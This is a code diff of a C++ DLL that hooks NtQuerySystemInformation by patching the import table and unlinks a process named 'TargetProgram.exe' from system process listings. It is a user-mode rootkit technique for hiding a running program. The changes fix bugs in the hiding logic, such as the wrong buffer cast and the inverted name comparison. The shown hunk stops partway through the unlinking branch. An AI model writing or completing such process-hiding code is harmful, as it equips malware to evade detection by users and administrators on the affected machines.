@@ -1,14 +1,14 @@
 #include "Hooker.h"
 
 PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)(
-	GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation")
+	GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation")
 	);
 
-bool __stdcall DllMain(HINSTANCE hInstance,
-	DWORD dwReason,
-	LPVOID dwReserved
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD ul_reason_for_call,
+	LPVOID lpReserved
 ) {
-	switch (dwReason) {
+	switch (ul_reason_for_call) {
 		case DLL_PROCESS_ATTACH:
 			StartHook();
 			break;
@@ -21,20 +21,18 @@ void StartHook() {
 
 	MODULEINFO modInfo = { 0 };
 	HMODULE hModule = GetModuleHandle(0);
-	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo));
+	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));
 
 	LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;
 
 	PIMAGE_DOS_HEADER		pIDH = (PIMAGE_DOS_HEADER)		pAddress;
 	PIMAGE_NT_HEADERS		pINH = (PIMAGE_NT_HEADERS)		(pAddress + pIDH->e_lfanew);
 	PIMAGE_OPTIONAL_HEADER	pIOH = (PIMAGE_OPTIONAL_HEADER)	&(pINH->OptionalHeader);
-
-
 	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress +
 		pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
 	for (; pIID->Characteristics; pIID++)
-		if(!strcmp((char*)(pAddress + pIID->Name), "ntdll.dll"))
+		if(!strcmp("ntdll.dll", (char*)(pAddress + pIID->Name)))
 			break;
 
 	PIMAGE_THUNK_DATA		pITD			= (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
@@ -72,18 +70,18 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(
 		ReturnLength
 	);
 
-	if (SystemProcessInformation == SystemInformationClass && status == STATUS_SUCCESS) {
+	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status) {
 
 
 		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
-		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformationClass;
+		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
 
 		do{
 
 			pCurrent = pNext;
 			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-			if (wcsncmp(L"TargetProgram.exe", pNext->ImageName.Buffer, pNext->ImageName.Length)) {
+			if (!wcsncmp(pNext->ImageName.Buffer, L"TargetProgram.exe", pNext->ImageName.Length)) {
 				if (!pNext->NextEntryOffset)
 					pCurrent->NextEntryOffset = 0;
 				else
